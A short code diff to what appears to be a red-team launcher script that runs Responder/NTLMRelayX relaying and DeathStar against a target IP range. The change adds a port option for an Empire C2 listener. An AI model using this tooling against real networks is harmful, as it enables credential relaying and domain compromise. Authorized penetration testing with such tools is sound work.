@@ -33,6 +33,9 @@ def main():
     parser.add_argument('target_ip', help='Target IP / Range / Subnet (nmap format)',
                         nargs='?', default = ''
     )
+    parser.add_argument('--port', '-p', help='Port for Empire listener (8443)',
+                        default='8443'
+    )
     parser.add_argument('--no-relay', help='Disable Responder / NTLMRelayX spoofing and relaying',
                         action='store_true', dest='disable_relay'
     )
@@ -43,6 +46,7 @@ def main():
     
     host_ip = args.host_ip
     target_ip = args.target_ip
+    empire_lport = args.port
     disable_relay = args.disable_relay
     disable_deathstar = args.disable_deathstar
     
@@ -72,7 +76,7 @@ def main():
     
     
     print("\nLaunching DeathStar (waiting 5s)...")
-    command = 'cd /opt/DeathStar && python3 ./DeathStar.py -u %s -p %s -lip %s' % (empire_user, empire_pass, host_ip)
+    command = 'cd /opt/DeathStar && python3 ./DeathStar.py -u %s -p %s -lip %s -lp %s' % (empire_user, empire_pass, host_ip, empire_lport)
     #tmux_window.split_window(shell=command)
     tmux_pane = tmux_window.split_window()
     tmux_pane.send_keys(command)
